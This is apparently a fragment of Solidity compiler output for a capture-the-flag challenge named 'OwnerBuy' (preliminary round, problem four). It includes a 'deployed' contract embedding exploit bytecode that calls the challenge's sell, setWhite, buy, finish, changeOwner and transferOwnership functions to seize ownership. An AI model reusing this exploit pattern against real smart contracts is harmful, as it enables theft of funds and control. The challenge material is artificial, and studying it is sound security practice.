											"name": "DUP1"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "PUSH",
											"value": "536166654D6174683A206164646974696F6E206F766572666C6F770000000000"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "DUP2"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "MSTORE"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "POP"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "ADD"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "SWAP2"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "POP"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "POP"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "MLOAD"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "DUP1"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "SWAP2"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "SUB"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "SWAP1"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "REVERT"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "tag",
											"value": "236"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "JUMPDEST"
										},
										{
											"begin": 1031,
											"end": 1032,
											"name": "DUP1"
										},
										{
											"begin": 1024,
											"end": 1032,
											"name": "SWAP2"
										},
										{
											"begin": 1024,
											"end": 1032,
											"name": "POP"
										},
										{
											"begin": 1024,
											"end": 1032,
											"name": "POP"
										},
										{
											"begin": 859,
											"end": 1040,
											"name": "SWAP3"
										},
										{
											"begin": 859,
											"end": 1040,
											"name": "SWAP2"
										},
										{
											"begin": 859,
											"end": 1040,
											"name": "POP"
										},
										{
											"begin": 859,
											"end": 1040,
											"name": "POP"
										},
										{
											"begin": 859,
											"end": 1040,
											"name": "JUMP",
											"value": "[out]"
										}
									],
									".data": {
										"245F15FF17F551913A7A18385165551503906A406F905AC1C2437281A7CD0CFE": "4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061646472657373",
										"24883CC5FE64ACE9D0DF1893501ECB93C77180F0FF69CCA79AFFB3C316DC8029": "45524332303a20617070726f766520746f20746865207a65726f2061646472657373",
										"C953F4879035ED60E766B34720F656AAB5C697B141D924C283124ECEDB91C208": "45524332303a20617070726f76652066726f6d20746865207a65726f2061646472657373"
									}
								}
							}
						},
						"methodIdentifiers": {
							"Times(address)": "1c87e971",
							"_owner()": "b2bdfa7b",
							"_previousOwner()": "6e63cd96",
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"buy()": "a6f2ae3a",
							"changeOwner()": "62a09477",
							"changestatus(address)": "51ec819f",
							"decimals()": "313ce567",
							"decreaseAllowance(address,uint256)": "a457c2d7",
							"finish()": "d56b2889",
							"increaseAllowance(address,uint256)": "39509351",
							"isWhite(address)": "a348c289",
							"lock()": "f83d08ba",
							"name()": "06fdde03",
							"owner()": "8da5cb5b",
							"renounceOwnership()": "715018a6",
							"sell(uint256)": "e4849b32",
							"setWhite(address)": "c03646ba",
							"status(address)": "645b8b1b",
							"symbol()": "95d89b41",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd",
							"transferOwnership(address)": "f2fde38b",
							"unlock()": "a69df4b5",
							"unsetWhite(address)": "41702014"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.17+commit.d19bba13\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"name\":\"finished\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"Times\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"_owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"_previousOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"buy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"changeOwner\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"changestatus\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"finish\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"isWhite\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"lock\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"sell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"setWhite\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"status\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"unlock\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"unsetWhite\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{\"allowance(address,address)\":{\"details\":\"See {IERC20-allowance}.\"},\"approve(address,uint256)\":{\"details\":\"See {IERC20-approve}.      * Requirements:      * - `spender` cannot be the zero address.\"},\"balanceOf(address)\":{\"details\":\"See {IERC20-balanceOf}.\"},\"decimals()\":{\"details\":\"Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5,05` (`505 / 10 ** 2`).      * Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei.      * NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}.\"},\"decreaseAllowance(address,uint256)\":{\"details\":\"Atomically decreases the allowance granted to `spender` by the caller.      * This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}.      * Emits an {Approval} event indicating the updated allowance.      * Requirements:      * - `spender` cannot be the zero address. - `spender` must have allowance for the caller of at least `subtractedValue`.\"},\"increaseAllowance(address,uint256)\":{\"details\":\"Atomically increases the allowance granted to `spender` by the caller.      * This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}.      * Emits an {Approval} event indicating the updated allowance.      * Requirements:      * - `spender` cannot be the zero address.\"},\"name()\":{\"details\":\"Returns the name of the token.\"},\"owner()\":{\"details\":\"Returns the address of the current owner.\"},\"renounceOwnership()\":{\"details\":\"Leaves the contract without owner. It will not be possible to call `onlyOwner` functions anymore. Can only be called by the current owner.      * NOTE: Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner.\"},\"symbol()\":{\"details\":\"Returns the symbol of the token, usually a shorter version of the name.\"},\"totalSupply()\":{\"details\":\"See {IERC20-totalSupply}.\"},\"transfer(address,uint256)\":{\"details\":\"See {IERC20-transfer}.      * Requirements:      * - `recipient` cannot be the zero address. - the caller must have a balance of at least `amount`.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"See {IERC20-transferFrom}.      * Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20};      * Requirements: - `sender` and `recipient` cannot be the zero address. - `sender` must have a balance of at least `value`. - the caller must have allowance for `sender`'s tokens of at least `amount`.\"},\"transferOwnership(address)\":{\"details\":\"Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner.\"}}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/OwnerBuy.sol\":\"OwnerBuy\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/OwnerBuy.sol\":{\"keccak256\":\"0x6c5b72099bc5f9740cbeb28650f50b1291a1eca5fbdbf6611673c9c8bcf2ba41\",\"urls\":[\"bzz-raw://f123693ee63491f5f4e4f8a62829af806c8814e5bdaaf6ce34ce08dbf396c33d\",\"dweb:/ipfs/QmPoszddSPRrmMRMFwfT9cXvCZmLbSEobQwqV2p1qEvd99\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/ERC20.sol\":{\"keccak256\":\"0x91a3b598fc86ea761b5a8296e26690e460e78d1606eb518994e5c2ba15fa194f\",\"urls\":[\"bzz-raw://f2e312a214c618db25822c5af3c0ea4811c7f42422b0d1051d468adbfbb53774\",\"dweb:/ipfs/QmdG5we7FRV1TFopjEvhSb63e5K2HUE3Y5fcdcR3CcuDe4\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/ERC20Detailed.sol\":{\"keccak256\":\"0xe20fce8726ac6988a627b4abae707647c8c46d9b5be24e0e085c718e854d9e34\",\"urls\":[\"bzz-raw://99a90f29bbd180bc88edf71c0583ec07d109bcfae5530aaffee434d0188c33e8\",\"dweb:/ipfs/Qmb2AKkdtcH2eWtXtaaSqABrLtBgcc9ppkn4iJPP89NNKp\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/IERC20.sol\":{\"keccak256\":\"0xd45135fede71fe4b2f06ccc22c459f880912785065a13f5ebf85ebe3d07d632e\",\"urls\":[\"bzz-raw://e38e11ed61a168499a2128f65c4248f9cb76a12fb0c9f2ae0e0e0ade46c5ba9f\",\"dweb:/ipfs/QmdAEvzLRsCtT6Yp1ruyymfaQ4hDtQMmBFjYY9MB4YQSBm\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/SafeMath.sol\":{\"keccak256\":\"0x11a066623aa9848c105e3610dd03f30d87881271d8da83a3974f898d5314025c\",\"urls\":[\"bzz-raw://76812a0f7047a8d98e291415723003b6238024ef37572453dcd96c70c946f9a7\",\"dweb:/ipfs/Qmf8SQN4J9ghTq3mVjxenmVAZtR8RnqvdfDvR5jma1gpJk\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 14,
								"contract": "赛题-预赛/第四题/OwnerBuy.sol:OwnerBuy",
								"label": "_owner",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							},
							{
								"astId": 16,
								"contract": "赛题-预赛/第四题/OwnerBuy.sol:OwnerBuy",
								"label": "_previousOwner",
								"offset": 0,
								"slot": "1",
								"type": "t_address"
							},
							{
								"astId": 600,
								"contract": "赛题-预赛/第四题/OwnerBuy.sol:OwnerBuy",
								"label": "_balances",
								"offset": 0,
								"slot": "2",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 606,
								"contract": "赛题-预赛/第四题/OwnerBuy.sol:OwnerBuy",
								"label": "_allowances",
								"offset": 0,
								"slot": "3",
								"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
							},
							{
								"astId": 608,
								"contract": "赛题-预赛/第四题/OwnerBuy.sol:OwnerBuy",
								"label": "_totalSupply",
								"offset": 0,
								"slot": "4",
								"type": "t_uint256"
							},
							{
								"astId": 973,
								"contract": "赛题-预赛/第四题/OwnerBuy.sol:OwnerBuy",
								"label": "_name",
								"offset": 0,
								"slot": "5",
								"type": "t_string_storage"
							},
							{
								"astId": 975,
								"contract": "赛题-预赛/第四题/OwnerBuy.sol:OwnerBuy",
								"label": "_symbol",
								"offset": 0,
								"slot": "6",
								"type": "t_string_storage"
							},
							{
								"astId": 977,
								"contract": "赛题-预赛/第四题/OwnerBuy.sol:OwnerBuy",
								"label": "_decimals",
								"offset": 0,
								"slot": "7",
								"type": "t_uint8"
							},
							{
								"astId": 161,
								"contract": "赛题-预赛/第四题/OwnerBuy.sol:OwnerBuy",
								"label": "status",
								"offset": 0,
								"slot": "8",
								"type": "t_mapping(t_address,t_bool)"
							},
							{
								"astId": 165,
								"contract": "赛题-预赛/第四题/OwnerBuy.sol:OwnerBuy",
								"label": "Times",
								"offset": 0,
								"slot": "9",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 169,
								"contract": "赛题-预赛/第四题/OwnerBuy.sol:OwnerBuy",
								"label": "whiteList",
								"offset": 0,
								"slot": "10",
								"type": "t_mapping(t_address,t_bool)"
							},
							{
								"astId": 172,
								"contract": "赛题-预赛/第四题/OwnerBuy.sol:OwnerBuy",
								"label": "MAXHOLD",
								"offset": 0,
								"slot": "11",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_bool": {
								"encoding": "inplace",
								"label": "bool",
								"numberOfBytes": "1"
							},
							"t_mapping(t_address,t_bool)": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => bool)",
								"numberOfBytes": "32",
								"value": "t_bool"
							},
							"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => mapping(address => uint256))",
								"numberOfBytes": "32",
								"value": "t_mapping(t_address,t_uint256)"
							},
							"t_mapping(t_address,t_uint256)": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => uint256)",
								"numberOfBytes": "32",
								"value": "t_uint256"
							},
							"t_string_storage": {
								"encoding": "bytes",
								"label": "string",
								"numberOfBytes": "32"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							},
							"t_uint8": {
								"encoding": "inplace",
								"label": "uint8",
								"numberOfBytes": "1"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				},
				"deployed": {
					"abi": [
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "bytes32",
									"name": "salt",
									"type": "bytes32"
								}
							],
							"name": "deploy",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "getHash",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"赛题-预赛/第四题/OwnerBuy.sol\":5234:10771  contract deployed{\r... */\n  mstore(0x40, 0x80)\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":5263:10409  bytes contractBytecode = hex\"60806040526109eb806100136000396000f3fe6080604052600436106100915760003560e01c8063a6f2ae3a11610059578063a6f2ae3a1461027e578063d56b288914610295578063df05f42e146102ac578063ead4d3db146102c3578063f9dca989146102f257610091565b806306661abd1461017457806319ab453c146101a35780632f54bf6e146101e757806345710074146102505780637e10e9d114610267575b600060149054906101000a900460ff16610172576001600060146101000a81548160ff0219169083151502179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561013557600080fd5b505af1158015610149573d6000803e3d6000fd5b505050506040513d602081101561015f57600080fd5b8101908080519060200190929190505050505b005b34801561018057600080fd5b50610189610309565b604051808215151515815260200191505060405180910390f35b6101e5600480360360208110156101b957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061031c565b005b3480156101f357600080fd5b506102366004803603602081101561020a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061035f565b604051808215151515815260200191505060405180910390f35b34801561025c57600080fd5b506102656103bc565b005b34801561027357600080fd5b5061027c61046f565b005b34801561028a57600080fd5b5061029361064a565b005b3480156102a157600080fd5b506102aa6106f3565b005b3480156102b857600080fd5b506102c161079a565b005b3480156102cf57600080fd5b506102d8610868565b604051808215151515815260200191505060405180910390f35b3480156102fe57600080fd5b5061030761087b565b005b600060149054906101000a900460ff1681565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008060159054906101000a900460ff16610398576001600060156101000a81548160ff021916908315150217905550600090506103b7565b60008060156101000a81548160ff021916908315150217905550600190505b919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561043157600080fd5b505af1158015610445573d6000803e3d6000fd5b505050506040513d602081101561045b57600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561050f57600080fd5b505af1158015610523573d6000803e3d6000fd5b505050506040513d602081101561053957600080fd5b8101908080519060200190929190505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561060c57600080fd5b505af1158015610620573d6000803e3d6000fd5b505050506040513d602081101561063657600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a60016040518263ffffffff1660e01b81526004016020604051808303818588803b1580156106b457600080fd5b505af11580156106c8573d6000803e3d6000fd5b50505050506040513d60208110156106df57600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d56b28896040518163ffffffff1660e01b8152600401602060405180830381600087803b15801561075c57600080fd5b505af1158015610770573d6000803e3d6000fd5b505050506040513d602081101561078657600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f2fde38b73220866b1a2219f40e72f5c628b65d54268ca3a9d6040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561084e57600080fd5b505af1158015610862573d6000803e3d6000fd5b50505050565b600060159054906101000a900460ff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166351ec819f306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561091b57600080fd5b505af115801561092f573d6000803e3d6000fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166362a094776040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561099c57600080fd5b505af11580156109b0573d6000803e3d6000fd5b5050505056fea265627a7a72315820490de0313b1ad79570c77ae043ce5fe65f40e32cd15657be89fd034ab9e52c2464736f6c63430005110032\" */\n  mload(0x40)\n  dup1\n  0x0a20\n  add\n  0x40\n  mstore\n  dup1\n  0x09fe\n  dup2\n  mstore\n  0x20\n  add\n  data_4c860f020c00fbfdd70a1107a62bbb12045eac8dc19c5bf6e8411d5a5d3efce8\n  0x09fe\n  swap2\n  codecopy\n  0x00\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_1\n  swap3\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_1:\n  pop\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":5234:10771  contract deployed{\r... */\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_3\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_3:\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":5234:10771  contract deployed{\r... */\n  pop\n  jump(tag_4)\ntag_2:\n  dup3\n  dup1\n  sload\n  0x01\n  dup2\n  0x01\n  and\n  iszero\n  0x0100\n  mul\n  sub\n  and\n  0x02\n  swap1\n  div\n  swap1\n  0x00\n  mstore\n  keccak256(0x00, 0x20)\n  swap1\n  0x1f\n  add\n  0x20\n  swap1\n  div\n  dup2\n  add\n  swap3\n  dup3\n  0x1f\n  lt\n  tag_6\n  jumpi\n  dup1\n  mload\n  not(0xff)\n  and\n  dup4\n  dup1\n  add\n  or\n  dup6\n  sstore\n  jump(tag_5)\ntag_6:\n  dup3\n  dup1\n  add\n  0x01\n  add\n  dup6\n  sstore\n  dup3\n  iszero\n  tag_5\n  jumpi\n  swap2\n  dup3\n  add\ntag_7:\n  dup3\n  dup2\n  gt\n  iszero\n  tag_8\n  jumpi\n  dup3\n  mload\n  dup3\n  sstore\n  swap2\n  0x20\n  add\n  swap2\n  swap1\n  0x01\n  add\n  swap1\n  jump(tag_7)\ntag_8:\ntag_5:\n  pop\n  swap1\n  pop\n  tag_9\n  swap2\n  swap1\n  tag_10\n  jump\t// in\ntag_9:\n  pop\n  swap1\n  jump\t// out\ntag_10:\n  tag_11\n  swap2\n  swap1\ntag_12:\n  dup1\n  dup3\n  gt\n  iszero\n  tag_13\n  jumpi\n  0x00\n  dup2\n  0x00\n  swap1\n  sstore\n  pop\n  0x01\n  add\n  jump(tag_12)\ntag_13:\n  pop\n  swap1\n  jump\ntag_11:\n  swap1\n  jump\t// out\ntag_4:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\ndata_4c860f020c00fbfdd70a1107a62bbb12045eac8dc19c5bf6e8411d5a5d3efce8 